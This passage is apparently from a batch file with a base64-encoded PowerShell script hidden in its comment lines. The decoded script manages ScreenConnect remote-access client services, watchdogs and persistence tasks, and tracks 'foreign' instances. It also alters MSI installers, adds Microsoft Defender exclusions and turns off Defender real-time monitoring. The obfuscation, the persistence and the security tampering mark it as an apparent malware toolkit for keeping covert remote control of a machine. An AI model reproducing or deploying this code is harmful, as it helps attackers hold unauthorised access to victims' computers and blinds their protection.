::UGF0aA0KICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRwKSB7DQogICAg
::ICAgIEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkcCAtRXJyb3JBY3Rpb24gU2ls
::ZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgIGlm
::ICgkXyAtbWF0Y2ggJ15QUklNQVJZX0ZQPShbMC05YS1mQS1GXXsxNn0pXHMqJCcp
::IHsgJHByaW0gPSAkbWF0Y2hlc1sxXS5Ub0xvd2VyKCkgfQ0KICAgICAgICAgICAg
::aWYgKCRfIC1tYXRjaCAnXkFMVF9GUD0oWzAtOWEtZkEtRl17MTZ9KVxzKiQnKSB7
::ICRhbHQgPSAkbWF0Y2hlc1sxXS5Ub0xvd2VyKCkgfQ0KICAgICAgICAgICAgaWYg
::KCRfIC1tYXRjaCAnXkVYUEVDVEVEX1BSSU1BUlk9KFswLTlhLWZBLUZdezE2fSlc
::cyokJykgeyAkcHJpbSA9ICRtYXRjaGVzWzFdLlRvTG93ZXIoKSB9DQogICAgICAg
::ICAgICBpZiAoJF8gLW1hdGNoICdeRVhQRUNURURfQUxUPShbMC05YS1mQS1GXXsx
::Nn0pXHMqJCcpIHsgJGFsdCA9ICRtYXRjaGVzWzFdLlRvTG93ZXIoKSB9DQogICAg
::ICAgIH0NCiAgICB9DQogICAgJHNjcmlwdDpTZXZyektlZXAgPSBAKCRwcmltLCAk
::YWx0KQ0KICAgIHJldHVybiBAKCRwcmltLCAkYWx0KQ0KfQ0KDQpmdW5jdGlvbiBT
::ZXQtU2V2cnpGcChbc3RyaW5nXSRQcmltYXJ5LCBbc3RyaW5nXSRBbHQpIHsNCiAg
::ICBpZiAoLW5vdCAkUHJpbWFyeSkgeyAkUHJpbWFyeSA9ICRzY3JpcHQ6U2V2cnpE
::ZWZhdWx0UHJpbWFyeSB9DQogICAgaWYgKC1ub3QgJEFsdCkgeyAkQWx0ID0gJHNj
::cmlwdDpTZXZyekRlZmF1bHRBbHQgfQ0KICAgIGlmICgtbm90IChUZXN0LVBhdGgg
::LUxpdGVyYWxQYXRoICRXb3JrRGlyKSkgeyBOZXctSXRlbSAtSXRlbVR5cGUgRGly
::ZWN0b3J5IC1QYXRoICRXb3JrRGlyIC1Gb3JjZSB8IE91dC1OdWxsIH0NCiAgICBA
::KA0KICAgICAgICAiUFJJTUFSWV9GUD0kKCRQcmltYXJ5LlRvTG93ZXIoKSkiLA0K
::ICAgICAgICAiQUxUX0ZQPSQoJEFsdC5Ub0xvd2VyKCkpIiwNCiAgICAgICAgIkVY
::UEVDVEVEX1BSSU1BUlk9JCgkUHJpbWFyeS5Ub0xvd2VyKCkpIiwNCiAgICAgICAg
::IkVYUEVDVEVEX0FMVD0kKCRBbHQuVG9Mb3dlcigpKSIsDQogICAgICAgICJVUERB
::VEVEPSQoKEdldC1EYXRlKS5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmluZygnbycp
::KSINCiAgICApIHwgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoIChHZXQtU2V2cnpD
::ZmdQYXRoKSAtRW5jb2RpbmcgQVNDSUkgLUZvcmNlDQogICAgJHNjcmlwdDpTZXZy
::ektlZXAgPSBAKCRQcmltYXJ5LlRvTG93ZXIoKSwgJEFsdC5Ub0xvd2VyKCkpDQp9
::DQoNCmZ1bmN0aW9uIFN5bmMtU2V2cnpFeHBlY3RlZChbc3RyaW5nXSRFeHBlY3Rl
::ZFRleHQpIHsNCiAgICAkcHJpbSA9ICRudWxsOyAkYWx0ID0gJG51bGwNCiAgICBm
::b3JlYWNoICgkbGluZSBpbiAoJEV4cGVjdGVkVGV4dCAtc3BsaXQgImByP2BuIikp
::IHsNCiAgICAgICAgaWYgKCRsaW5lIC1tYXRjaCAnXkVYUEVDVEVEX1BSSU1BUlk9
::KFswLTlhLWZBLUZdezE2fSlccyokJykgeyAkcHJpbSA9ICRtYXRjaGVzWzFdLlRv
::TG93ZXIoKSB9DQogICAgICAgIGlmICgkbGluZSAtbWF0Y2ggJ15FWFBFQ1RFRF9B
::TFQ9KFswLTlhLWZBLUZdezE2fSlccyokJykgeyAkYWx0ID0gJG1hdGNoZXNbMV0u
::VG9Mb3dlcigpIH0NCiAgICB9DQogICAgaWYgKC1ub3QgJHByaW0pIHsgJHByaW0g
::PSAoR2V0LVNldnJ6S2VlcClbMF0gfQ0KICAgIGlmICgtbm90ICRhbHQpIHsgJGFs
::dCA9IChHZXQtU2V2cnpLZWVwKVsxXSB9DQogICAgU2V0LVNldnJ6RnAgJHByaW0g
::JGFsdA0KICAgIHJldHVybiAiU0VWUlp8JHByaW18JGFsdCINCn0NCg0KZnVuY3Rp
::b24gUHJvdGVjdC1Nc2lTaWJsaW5nU2FmZShbc3RyaW5nXSRNc2lQYXRoKSB7DQog
::ICAgaWYgKC1ub3QgJE1zaVBhdGggLW9yIC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJh
::bFBhdGggJE1zaVBhdGgpKSB7IHJldHVybiAkbnVsbCB9DQogICAgJHNhZmUgPSBK
::b2luLVBhdGggJGVudjpURU1QICgic2Nfc2FmZV97MH0ubXNpIiAtZiBbZ3VpZF06
::Ok5ld0d1aWQoKS5Ub1N0cmluZygnTicpKQ0KICAgIHRyeSB7DQogICAgICAgIENv
::cHktSXRlbSAtTGl0ZXJhbFBhdGggJE1zaVBhdGggLURlc3RpbmF0aW9uICRzYWZl
::IC1Gb3JjZQ0KICAgICAgICAkaSA9IE5ldy1PYmplY3QgLUNvbU9iamVjdCBXaW5k
::b3dzSW5zdGFsbGVyLkluc3RhbGxlcg0KICAgICAgICAkZGIgPSAkaS5PcGVuRGF0
::YWJhc2UoKFJlc29sdmUtUGF0aCAtTGl0ZXJhbFBhdGggJHNhZmUpLlBhdGgsIDEp
::DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICAkdiA9ICRkYi5PcGVuVmlldygn
::REVMRVRFIEZST00gYFVwZ3JhZGVgJykNCiAgICAgICAgICAgICR2LkV4ZWN1dGUo
::KSB8IE91dC1OdWxsDQogICAgICAgICAgICAkZGIuQ29tbWl0KCkNCiAgICAgICAg
::fSBjYXRjaCB7DQogICAgICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGgg
::JHNhZmUgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAg
::ICAgICAgICByZXR1cm4gJG51bGwNCiAgICAgICAgfQ0KICAgICAgICB0cnkgew0K
::ICAgICAgICAgICAgJGRiMiA9ICRpLk9wZW5EYXRhYmFzZSgoUmVzb2x2ZS1QYXRo
::IC1MaXRlcmFsUGF0aCAkc2FmZSkuUGF0aCwgMCkNCiAgICAgICAgICAgICRjID0g
::JGRiMi5PcGVuVmlldygnU0VMRUNUIGBVcGdyYWRlQ29kZWAgRlJPTSBgVXBncmFk
::ZWAnKQ0KICAgICAgICAgICAgJGMuRXhlY3V0ZSgpIHwgT3V0LU51bGwNCiAgICAg
::ICAgICAgIGlmICgkYy5GZXRjaCgpKSB7DQogICAgICAgICAgICAgICAgUmVtb3Zl
::LUl0ZW0gLUxpdGVyYWxQYXRoICRzYWZlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2ls
::ZW50bHlDb250aW51ZQ0KICAgICAgICAgICAgICAgIHJldHVybiAkbnVsbA0KICAg
::ICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIHt9DQogICAgICAgIHJldHVybiAk
::c2FmZQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICBpZiAoVGVzdC1QYXRoIC1MaXRl
::cmFsUGF0aCAkc2FmZSkgeyBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJHNhZmUg
::LUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIH0NCiAgICAgICAg
::cmV0dXJuICRudWxsDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBUZXN0LVVwZGF0ZU1h
::bmlmZXN0KFtzdHJpbmddJE1hbmlmZXN0UGF0aCwgW3N0cmluZ10kU2lnUGF0aCwg
::W2hhc2h0YWJsZV0kRmlsZU1hcCkgew0KICAgIGlmICgtbm90IChUZXN0LVBhdGgg
::LUxpdGVyYWxQYXRoICRNYW5pZmVzdFBhdGgpIC1vciAtbm90IChUZXN0LVBhdGgg
::LUxpdGVyYWxQYXRoICRTaWdQYXRoKSkgeyByZXR1cm4gJ21pc3NpbmcnIH0NCiAg
::ICBpZiAoLW5vdCAkc2NyaXB0OlVwZGF0ZVB1YktleVhtbCAtb3IgJHNjcmlwdDpV
::cGRhdGVQdWJLZXlYbWwgLW1hdGNoICdQTEFDRUhPTERFUicpIHsgcmV0dXJuICdu
::by1wdWJrZXknIH0NCiAgICB0cnkgew0KICAgICAgICAkYnl0ZXMgPSBbSU8uRmls
::ZV06OlJlYWRBbGxCeXRlcygoUmVzb2x2ZS1QYXRoIC1MaXRlcmFsUGF0aCAkTWFu
::aWZlc3RQYXRoKS5QYXRoKQ0KICAgICAgICAkc2lnID0gW0NvbnZlcnRdOjpGcm9t
::QmFzZTY0U3RyaW5nKChbSU8uRmlsZV06OlJlYWRBbGxUZXh0KChSZXNvbHZlLVBh
::dGggLUxpdGVyYWxQYXRoICRTaWdQYXRoKS5QYXRoKS5UcmltKCkpKQ0KICAgICAg
::ICAkcnNhID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUlNBXTo6Q3Jl
::YXRlKCkNCiAgICAgICAgJHJzYS5Gcm9tWG1sU3RyaW5nKCRzY3JpcHQ6VXBkYXRl
::UHViS2V5WG1sKQ0KICAgICAgICBpZiAoLW5vdCAkcnNhLlZlcmlmeURhdGEoJGJ5
::dGVzLCAkc2lnLCBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5IYXNoQWxn
::b3JpdGhtTmFtZV06OlNIQTI1NiwgW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFw
::aHkuUlNBU2lnbmF0dXJlUGFkZGluZ106OlBrY3MxKSkgew0KICAgICAgICAgICAg
::cmV0dXJuICdiYWQtc2lnJw0KICAgICAgICB9DQogICAgICAgICRkb2MgPSBHZXQt
::Q29udGVudCAtTGl0ZXJhbFBhdGggJE1hbmlmZXN0UGF0aCAtUmF3IHwgQ29udmVy
::dEZyb20tSnNvbg0KICAgICAgICBmb3JlYWNoICgkbmFtZSBpbiAkRmlsZU1hcC5L
::ZXlzKSB7DQogICAgICAgICAgICAkcGF0aCA9ICRGaWxlTWFwWyRuYW1lXQ0KICAg
::ICAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHBhdGgp
::KSB7IHJldHVybiAibWlzc2luZy1maWxlOiRuYW1lIiB9DQogICAgICAgICAgICAk
::d2FudCA9IFtzdHJpbmddJGRvYy5maWxlcy4kbmFtZQ0KICAgICAgICAgICAgaWYg
::KC1ub3QgJHdhbnQpIHsgcmV0dXJuICJub3QtaW4tbWFuaWZlc3Q6JG5hbWUiIH0N
::CiAgICAgICAgICAgICRzaGEgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBo
::eS5TSEEyNTZdOjpDcmVhdGUoKQ0KICAgICAgICAgICAgJGZzID0gW0lPLkZpbGVd
::OjpPcGVuUmVhZCgoUmVzb2x2ZS1QYXRoIC1MaXRlcmFsUGF0aCAkcGF0aCkuUGF0
::aCkNCiAgICAgICAgICAgIHRyeSB7ICRoYXNoID0gKFtCaXRDb252ZXJ0ZXJdOjpU
::b1N0cmluZygkc2hhLkNvbXB1dGVIYXNoKCRmcykpKS5SZXBsYWNlKCctJywgJycp
::LlRvTG93ZXIoKSB9DQogICAgICAgICAgICBmaW5hbGx5IHsgJGZzLkNsb3NlKCkg
::fQ0KICAgICAgICAgICAgaWYgKCRoYXNoIC1uZSAkd2FudC5Ub0xvd2VyKCkpIHsg
::cmV0dXJuICJoYXNoLW1pc21hdGNoOiRuYW1lIiB9DQogICAgICAgIH0NCiAgICAg
::ICAgcmV0dXJuICdvaycNCiAgICB9IGNhdGNoIHsgcmV0dXJuICJlcnJvcjokKCRf
::LkV4Y2VwdGlvbi5NZXNzYWdlKSIgfQ0KfQ0KDQpmdW5jdGlvbiBHZXQtS2VlcEZp
::bmdlcnByaW50cyB7IHJldHVybiBAKEdldC1TZXZyektlZXApIH0NCg0KZnVuY3Rp
::b24gR2V0LU1zaVByb3BlcnR5KFtzdHJpbmddJE1zaVBhdGgsIFtzdHJpbmddJFBy
::b3BlcnR5TmFtZSkgew0KICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQ
::YXRoICRNc2lQYXRoKSkgeyByZXR1cm4gJG51bGwgfQ0KICAgIHRyeSB7DQogICAg
::ICAgICRpID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IFdpbmRvd3NJbnN0YWxsZXIu
::SW5zdGFsbGVyDQogICAgICAgICRkYiA9ICRpLk9wZW5EYXRhYmFzZSgoUmVzb2x2
::ZS1QYXRoIC1MaXRlcmFsUGF0aCAkTXNpUGF0aCkuUGF0aCwgMCkNCiAgICAgICAg
::JHYgPSAkZGIuT3BlblZpZXcoIlNFTEVDVCBgVmFsdWVgIEZST00gYFByb3BlcnR5
::YCBXSEVSRSBgUHJvcGVydHlgPSckUHJvcGVydHlOYW1lJyIpDQogICAgICAgICR2
::LkV4ZWN1dGUoKSB8IE91dC1OdWxsDQogICAgICAgICRyID0gJHYuRmV0Y2goKQ0K
::ICAgICAgICBpZiAoLW5vdCAkcikgeyByZXR1cm4gJG51bGwgfQ0KICAgICAgICBy
::ZXR1cm4gW3N0cmluZ10kci5TdHJpbmdEYXRhKDEpDQogICAgfSBjYXRjaCB7IHJl
::dHVybiAkbnVsbCB9DQp9DQoNCmZ1bmN0aW9uIEdldC1GcEZyb21Qcm9kdWN0TmFt
::ZShbc3RyaW5nXSRQcm9kdWN0TmFtZSkgew0KICAgIGlmICgkUHJvZHVjdE5hbWUg
::LW1hdGNoICdcKChbMC05YS1mQS1GXXsxNn0pXCknKSB7IHJldHVybiAkbWF0Y2hl
::c1sxXS5Ub0xvd2VyKCkgfQ0KICAgIHJldHVybiAkbnVsbA0KfQ0KDQpmdW5jdGlv
::biBUZXN0LU1zaVBhY2thZ2UoW3N0cmluZ10kUGF0aCwgW3N0cmluZ10kRXhwZWN0
::ZWRGcCA9ICcnKSB7DQogICAgaWYgKC1ub3QgJFBhdGggLW9yIC1ub3QgKFRlc3Qt
::UGF0aCAtTGl0ZXJhbFBhdGggJFBhdGgpKSB7IHJldHVybiAkZmFsc2UgfQ0KICAg
::IGlmICgoR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICRQYXRoKS5MZW5ndGggLWx0IDUw
::MDAwMCkgeyByZXR1cm4gJGZhbHNlIH0NCiAgICB0cnkgew0KICAgICAgICAkZnMg
::PSBbU3lzdGVtLklPLkZpbGVdOjpPcGVuUmVhZCgoUmVzb2x2ZS1QYXRoIC1MaXRl
::cmFsUGF0aCAkUGF0aCkuUGF0aCkNCiAgICAgICAgJG1hZ2ljID0gTmV3LU9iamVj
::dCBieXRlW10gNA0KICAgICAgICAkbnVsbCA9ICRmcy5SZWFkKCRtYWdpYywgMCwg
::NCkNCiAgICAgICAgJGZzLkNsb3NlKCkNCiAgICAgICAgaWYgKC1ub3QgKCRtYWdp
::Y1swXSAtZXEgMHhEMCAtYW5kICRtYWdpY1sxXSAtZXEgMHhDRiAtYW5kICRtYWdp
::Y1syXSAtZXEgMHgxMSAtYW5kICRtYWdpY1szXSAtZXEgMHhFMCkpIHsgcmV0dXJu
::ICRmYWxzZSB9DQogICAgfSBjYXRjaCB7IHJldHVybiAkZmFsc2UgfQ0KICAgIGlm
::ICgkRXhwZWN0ZWRGcCkgew0KICAgICAgICAkZnAgPSBHZXQtRnBGcm9tUHJvZHVj
::dE5hbWUgKEdldC1Nc2lQcm9wZXJ0eSAkUGF0aCAnUHJvZHVjdE5hbWUnKQ0KICAg
::ICAgICBpZiAoLW5vdCAkZnAgLW9yICRmcCAtbmUgJEV4cGVjdGVkRnAuVG9Mb3dl
::cigpKSB7IHJldHVybiAkZmFsc2UgfQ0KICAgIH0NCiAgICByZXR1cm4gJHRydWUN
::Cn0NCg0KZnVuY3Rpb24gR2V0LVNjSW1hZ2VQYXRoKFtzdHJpbmddJEZpbmdlcnBy
::aW50KSB7DQogICAgaWYgKC1ub3QgJEZpbmdlcnByaW50KSB7IHJldHVybiAnJyB9
::DQogICAgJHAgPSAiSEtMTTpcU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZp
::Y2VzXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJpbnQpIg0KICAgIHRy
::eSB7DQogICAgICAgIHJldHVybiBbc3RyaW5nXShHZXQtSXRlbVByb3BlcnR5IC1M
::aXRlcmFsUGF0aCAkcCAtTmFtZSBJbWFnZVBhdGggLUVycm9yQWN0aW9uIFN0b3Ap
::LkltYWdlUGF0aA0KICAgIH0gY2F0Y2ggeyByZXR1cm4gJycgfQ0KfQ0KDQpmdW5j
::dGlvbiBUZXN0LVNjUnVubmluZyhbc3RyaW5nXSRGaW5nZXJwcmludCkgew0KICAg
::IGlmICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1cm4gJGZhbHNlIH0NCiAgICAk
::b3V0ID0gJiBzYy5leGUgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmlu
::Z2VycHJpbnQpIiAyPiYxIHwgT3V0LVN0cmluZw0KICAgIHJldHVybiBbYm9vbF0o
::JG91dCAtbWF0Y2ggJyg/aSlTVEFURVxzKjpccypcZCtccysoUlVOTklOR3xTVEFS
::VF9QRU5ESU5HfENPTlRJTlVFX1BFTkRJTkcpJykNCn0NCg0KZnVuY3Rpb24gVGVz
::dC1TY1NlcnZpY2VFeGlzdHMoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsNCiAgICBp
::ZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuICRmYWxzZSB9DQogICAgJiBz
::Yy5leGUgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJpbnQp
::IiAyPiYxIHwgT3V0LU51bGwNCiAgICByZXR1cm4gKCRMQVNURVhJVENPREUgLWVx
::IDApDQp9DQoNCmZ1bmN0aW9uIEFkZC1TY0RlZmVuZGVyRXhjbHVzaW9uKFtzdHJp
::bmddJEZwKSB7DQogICAgdHJ5IHsNCiAgICAgICAgJG5hbWVzID0gQCgiU2NyZWVu
::Q29ubmVjdCBDbGllbnQgKCRGcCkiLCAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJykN
::CiAgICAgICAgZm9yZWFjaCAoJGJhc2UgaW4gQCgke2VudjpQcm9ncmFtRmlsZXMo
::eDg2KX0sICRlbnY6UHJvZ3JhbUZpbGVzKSkgew0KICAgICAgICAgICAgaWYgKC1u
::b3QgJGJhc2UpIHsgY29udGludWUgfQ0KICAgICAgICAgICAgZm9yZWFjaCAoJG4g
::aW4gJG5hbWVzKSB7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggKEpv
::aW4tUGF0aCAkYmFzZSAkbikgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUg
::fQ0KICAgICAgICB9DQogICAgICAgIEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lv
::blByb2Nlc3MgJ1NjcmVlbkNvbm5lY3QuQ2xpZW50U2VydmljZS5leGUnIC1FcnJv
::ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIEFkZC1NcFByZWZlcmVu
::Y2UgLUV4Y2x1c2lvblByb2Nlc3MgJ1NjcmVlbkNvbm5lY3QuV2luZG93c0NsaWVu
::dC5leGUnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIFNl
::dC1NcFByZWZlcmVuY2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWUg
::LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICB9IGNhdGNoIHt9DQp9
::DQoNCg0KZnVuY3Rpb24gSW52b2tlLUV4dGVybWluYXRlIHsNCiAgICAjIEw0NS9M
::NTA6IEhBTkRTLU9GRiDigJQgZG8gbm90IHRvdWNoIGFueSBTY3JlZW5Db25uZWN0
::IHdoaWxlIGRpYWdub3NpbmcgZGlzY29ubmVjdHMuDQogICAgJGxvZyA9IEpvaW4t
::UGF0aCAkV29ya0RpciAnZXh0ZXJtaW5hdGUubG9nJw0KICAgIEFkZC1Db250ZW50
::IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAoJ3swfSBleHRlcm1pbmF0ZV9TS0lQ
::UEVEX0w0NSBoYW5kcy1vZmYtYWxsLXNjJyAtZiAoR2V0LURhdGUgLUZvcm1hdCAn
::eXl5eS1NTS1kZCBISDptbTpzcycpKSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
::aW51ZQ0KICAgIHJldHVybiAnU0tJUHxoYW5kcy1vZmYtc2MtTDQ1Jw0KfQ0KDQpm
::dW5jdGlvbiBVcGRhdGUtU3RhdGUgew0KICAgICRrZWVwID0gQChHZXQtS2VlcEZp
::bmdlcnByaW50cykNCiAgICAkc2V2cnogPSBAKEdldC1TZXZyektlZXApDQogICAg
::JHByaW1GcCA9ICRzZXZyelswXTsgJGFsdEZwID0gJHNldnJ6WzFdDQogICAgJHBy
::aW0gPSAkbnVsbDsgJGFsdCA9ICRudWxsDQogICAgZm9yZWFjaCAoJHN2YyBpbiAo
::R2V0LVNlcnZpY2UgLU5hbWUgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicpKSB7DQog
::ICAgICAgIGlmICgkc3ZjLk5hbWUgLW1hdGNoICdcKChbMC05YS1mXXsxNn0pXCkn
::KSB7DQogICAgICAgICAgICAkZnAgPSAkbWF0Y2hlc1sxXS5Ub0xvd2VyKCkNCiAg
::ICAgICAgICAgIGlmICgkZnAgLWVxICRwcmltRnApIHsgJHByaW0gPSAiJCgkc3Zj
::LlN0YXR1cykiIH0NCiAgICAgICAgICAgIGVsc2VpZiAoJGZwIC1lcSAkYWx0RnAp
::IHsgJGFsdCA9ICIkKCRzdmMuU3RhdHVzKSIgfQ0KICAgICAgICB9DQogICAgfQ0K
::ICAgICRmb3JlaWduID0gQCgpDQogICAgZm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNl
::cnZpY2UgLU5hbWUgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicpKSB7DQogICAgICAg
::IGlmICgkc3ZjLk5hbWUgLW1hdGNoICdcKChbMC05YS1mXXsxNn0pXCknIC1hbmQg
::JG1hdGNoZXNbMV0gLW5vdGluICRrZWVwKSB7DQogICAgICAgICAgICAkZm9yZWln
::biArPSAkbWF0Y2hlc1sxXQ0KICAgICAgICB9DQogICAgfQ0KICAgICRpZCA9IFJl
::YWQtSWRlbnRpdHkNCiAgICAkdGFza3NPayA9IDA7ICR0YXNrc1RvdGFsID0gMA0K
::ICAgIGZvcmVhY2ggKCRrIGluICdUQVNLX0EnLCdUQVNLX0InLCdUQVNLX0MnLCdU
::QVNLX0QnKSB7DQogICAgICAgICR0YXNrc1RvdGFsKysNCiAgICAgICAgJHRuID0g
::Tm9ybWFsaXplLVRhc2tOYW1lIChbc3RyaW5nXSRpZFska10pDQogICAgICAgIGlm
::ICgtbm90ICR0bikgeyBjb250aW51ZSB9DQogICAgICAgICRtYXJrZXIgPSBpZiAo
::JGsgLWVxICdUQVNLX0InKSB7ICdldGxfbW9uLmNtZCcgfSBlbHNlIHsgJ293bl9t
::b24uY21kJyB9DQogICAgICAgIGlmICgoVGVzdC1UYXNrT3duc01vbiAkdG4gJG1h
::cmtlcikgLW9yIChUZXN0LVRhc2tPd25zTW9uICgiXCR0biIpICRtYXJrZXIpKSB7
::ICR0YXNrc09rKysgfQ0KICAgIH0NCiAgICBpZiAoLW5vdCAkTW9uUGF0aCkgeyAk
::TW9uUGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnb3duX21vbi5jbWQnIH0NCiAg
::ICAkd2QgPSBFbnN1cmUtV2F0Y2hkb2cNCiAgICAkcHJldiA9IEB7fQ0KICAgICRz
::dGF0ZVBhdGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ3N0YXRlLmpzb24nDQogICAg
::aWYgKFRlc3QtUGF0aCAkc3RhdGVQYXRoKSB7DQogICAgICAgIHRyeSB7IChHZXQt
::Q29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRlUGF0aCAtUmF3IHwgQ29udmVydEZy
::b20tSnNvbikuUFNPYmplY3QuUHJvcGVydGllcyB8IEZvckVhY2gtT2JqZWN0IHsg
::JHByZXZbJF8uTmFtZV0gPSAkXy5WYWx1ZSB9IH0gY2F0Y2gge30NCiAgICB9DQog
::ICAgJGluc3RhbGxDb3VudCA9IDENCiAgICBpZiAoJHByZXYuaW5zdGFsbENvdW50
::KSB7ICRpbnN0YWxsQ291bnQgPSBbaW50XSRwcmV2Lmluc3RhbGxDb3VudCB9DQog
::ICAgaWYgKCRwcmV2LnByaW0gLWFuZCAkcHJldi5wcmltIC1uZSAnUnVubmluZycg
::LWFuZCAkcHJpbSAtZXEgJ1J1bm5pbmcnKSB7ICRpbnN0YWxsQ291bnQrKyB9DQog
::ICAgJHN0YXRlID0gW29yZGVyZWRdQHsNCiAgICAgICAgaG9zdCAgICAgICAgID0g
::JGVudjpDT01QVVRFUk5BTUUNCiAgICAgICAgdHMgICAgICAgICAgID0gKEdldC1E
::YXRlKS5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmluZygnbycpDQogICAgICAgIGJ1
::aWxkICAgICAgICA9ICRCdWlsZA0KICAgICAgICBwcmltICAgICAgICAgPSAkKGlm
::ICgkcHJpbSkgeyAkcHJpbSB9IGVsc2UgeyAnTUlTU0lORycgfSkNCiAgICAgICAg
::YWx0ICAgICAgICAgID0gJChpZiAoJGFsdCkgeyAkYWx0IH0gZWxzZSB7ICdNSVNT
::SU5HJyB9KQ0KICAgICAgICBmb3JlaWduICAgICAgPSAkZm9yZWlnbg0KICAgICAg
::ICB0YXNrc09rICAgICAgPSAkdGFza3NPaw0KICAgICAgICB0YXNrc1RvdGFsICAg
::PSAkdGFza3NUb3RhbA0KICAgICAgICB3YXRjaGRvZyAgICAgPSAkd2QNCiAgICAg
::ICAgaW5zdGFsbENvdW50ID0gJGluc3RhbGxDb3VudA0KICAgICAgICBsYXN0SGVh
::bCAgICAgPSAkKGlmICgkRXh0cmEpIHsgKEdldC1EYXRlKS5Ub1VuaXZlcnNhbFRp
::bWUoKS5Ub1N0cmluZygnbycpIH0gZWxzZWlmICgkcHJldi5sYXN0SGVhbCkgeyAk
::cHJldi5sYXN0SGVhbCB9IGVsc2UgeyAkbnVsbCB9KQ0KICAgICAgICBub3RlICAg
::ICAgICAgPSAkRXh0cmENCiAgICB9DQogICAgKCRzdGF0ZSB8IENvbnZlcnRUby1K
::c29uIC1Db21wcmVzcykgfCBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRl
::UGF0aCAtRm9yY2UNCiAgICByZXR1cm4gJHN0YXRlDQp9DQoNCnN3aXRjaCAoJEFj
::dGlvbikgew0KICAgICdpbml0JyAgICAgICAgICAgIHsgJGlkID0gSW5pdGlhbGl6
::ZS1JZGVudGl0eTsgJGlkLkdldEVudW1lcmF0b3IoKSB8IEZvckVhY2gtT2JqZWN0
::IHsgIiQoJF8uS2V5KT0kKCRfLlZhbHVlKSIgfSB9DQogICAgJ2lkZW50aXR5JyAg
::ICAgICAgeyAkaWQgPSBSZWFkLUlkZW50aXR5OyAkaWQuR2V0RW51bWVyYXRvcigp
::IHwgRm9yRWFjaC1PYmplY3QgeyAiJCgkXy5LZXkpPSQoJF8uVmFsdWUpIiB9IH0N
::CiAgICAnd2F0Y2hkb2cnICAgICAgICB7IEluc3RhbGwtV2F0Y2hkb2cgfCBPdXQt
::TnVsbCB9DQogICAgJ3dhdGNoZG9nLWVuc3VyZScgeyBFbnN1cmUtV2F0Y2hkb2cg
::fQ0KICAgICd0YXNrcy1lbnN1cmUnICAgIHsgRW5zdXJlLVBlcnNpc3RUYXNrcyB9
::DQogICAgJ3N0YXRlJyAgICAgICAgICAgeyBVcGRhdGUtU3RhdGUgfCBDb252ZXJ0
::VG8tSnNvbiAtQ29tcHJlc3MgfQ0KICAgICdyZXBhaXInICAgICAgICAgIHsgUmVw
::YWlyLVNDU2VydmljZSAkRnAgfQ0KICAgICdyZWdpc3RlcmVkJyAgICAgIHsgVGVz
::dC1TQ1JlZ2lzdGVyZWQgJEZwIH0NCiAgICAnZXh0ZXJtaW5hdGUnICAgICB7IElu
::dm9rZS1FeHRlcm1pbmF0ZSB9DQogICAgJ3Rlc3QtbXNpJyAgICAgICAgew0KICAg
::ICAgICAkcGF0aCA9ICRFeHRyYQ0KICAgICAgICBpZiAoLW5vdCAkcGF0aCkgeyBX
::cml0ZS1PdXRwdXQgJ25vJzsgYnJlYWsgfQ0KICAgICAgICBpZiAoVGVzdC1Nc2lQ
::YWNrYWdlICRwYXRoICRGcCkgeyBXcml0ZS1PdXRwdXQgJ3llcycgfSBlbHNlIHsg
::V3JpdGUtT3V0cHV0ICdubycgfQ0KICAgIH0NCiAgICAncHJvdGVjdC1tc2knICAg
